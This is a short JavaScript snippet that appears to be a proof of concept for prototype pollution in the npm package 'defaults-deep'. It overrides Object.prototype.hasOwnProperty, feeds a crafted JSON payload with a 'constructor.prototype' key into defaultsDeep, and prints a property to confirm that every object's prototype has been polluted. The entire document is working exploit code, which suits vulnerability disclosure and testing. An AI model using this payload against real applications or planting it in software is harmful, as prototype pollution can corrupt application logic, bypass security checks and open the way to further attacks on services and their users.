Object.prototype.hasOwnProperty = () => true;
const defaultsDeep = require('defaults-deep');
let obj = {};
console.log({}.polluted);
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
defaultsDeep({}, payload);
console.log({}.polluted);